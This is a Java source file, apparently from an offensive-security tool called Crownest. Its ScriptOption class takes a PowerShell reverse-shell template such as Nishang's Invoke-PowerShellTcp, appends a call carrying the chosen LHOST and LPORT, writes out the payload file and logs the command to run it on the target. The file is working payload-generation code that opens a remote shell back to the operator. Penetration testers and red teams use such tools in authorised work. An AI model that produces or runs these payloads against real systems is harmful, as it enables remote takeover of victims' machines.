package com.crownest.payload;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

/**
 * A {@link PayloadOption} backed by a local PowerShell reverse-shell template
 * (Nishang's Invoke-PowerShellTcp and the like).
 *
 * The template only defines a function. This option copies it and appends a
 * call to that function with the chosen LHOST/LPORT baked in, so dot-sourcing
 * the produced file, ". .\name.ps1", fires the reverse shell immediately.
 */
public final class ScriptOption implements PayloadOption {

    private final Path template;
    private final String fileName;
    private final String function;

    public ScriptOption(Path template, String function) {
        this.template = template;
        this.fileName = template.getFileName().toString();
        this.function = function;
    }

    public String fileName() {
        return fileName;
    }

    @Override
    public String display() {
        return "Script: " + fileName + "  (dot-source auto-exec)";
    }

    @Override
    public String kind() {
        return "Script";
    }

    /** The auto-execute line appended to the bottom of the generated script. */
    private String callLine(String ip, String port) {
        return function + " -Reverse -IPAddress " + ip + " -Port " + port;
    }

    @Override
    public String preview(String ip, String port, String shell) {
        String shownIp = ip == null || ip.isEmpty() ? "<ip>" : ip;
        String shownPort = port == null || port.isEmpty() ? "<port>" : port;
        return ". .\\" + fileName + "   ->   appends:  " + callLine(shownIp, shownPort);
    }

    @Override
    public PayloadGenerator.Result generate(String ip, String port, String shell, Path baseDir) {
        // Reuse the same strict validation as the msfvenom path, so a hostile
        // LHOST/LPORT can never be smuggled into the generated PowerShell.
        if (!PayloadGenerator.isValidHost(ip)) {
            return new PayloadGenerator.Result(false, null, "",
                    "Invalid LHOST. Use an IP address or hostname "
                            + "(letters, digits, dot, colon, hyphen, underscore only).");
        }
        if (!PayloadGenerator.isValidPort(port)) {
            return new PayloadGenerator.Result(false, null, "",
                    "Invalid LPORT. Use a number between 1 and 65535.");
        }

        String body;
        try {
            body = Files.readString(template, StandardCharsets.UTF_8);
        } catch (IOException e) {
            return new PayloadGenerator.Result(false, null, "",
                    "Could not read the template: " + e.getMessage());
        }

        String call = callLine(ip, port);
        StringBuilder out = new StringBuilder(body);
        if (!body.endsWith("\n")) {
            out.append("\n");
        }
        out.append("\n# Auto-execute on dot-source (added by Crownest)\n");
        out.append(call).append("\n");

        Path workDir;
        Path produced;
        try {
            String stamp = String.valueOf(System.currentTimeMillis());
            workDir = baseDir.resolve(stamp + "-" + slug(fileName));
            Files.createDirectories(workDir);
            produced = workDir.resolve(fileName);
            Files.writeString(produced, out.toString(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            return new PayloadGenerator.Result(false, null, "",
                    "Could not write the payload: " + e.getMessage());
        }

        String shown = ". .\\" + fileName + "   (auto-runs: " + call + ")";
        String log = "Wrote " + fileName + " with auto-execute line:\n  " + call
                + "\n\nOn the target, run:\n  . .\\" + fileName;
        return new PayloadGenerator.Result(true, produced, shown, log);
    }

    private static String slug(String name) {
        String s = name.toLowerCase().replaceAll("[^a-z0-9]+", "-").replaceAll("(^-|-$)", "");
        return s.isEmpty() ? "script" : s;
    }

    @Override
    public String toString() {
        return display();
    }
}
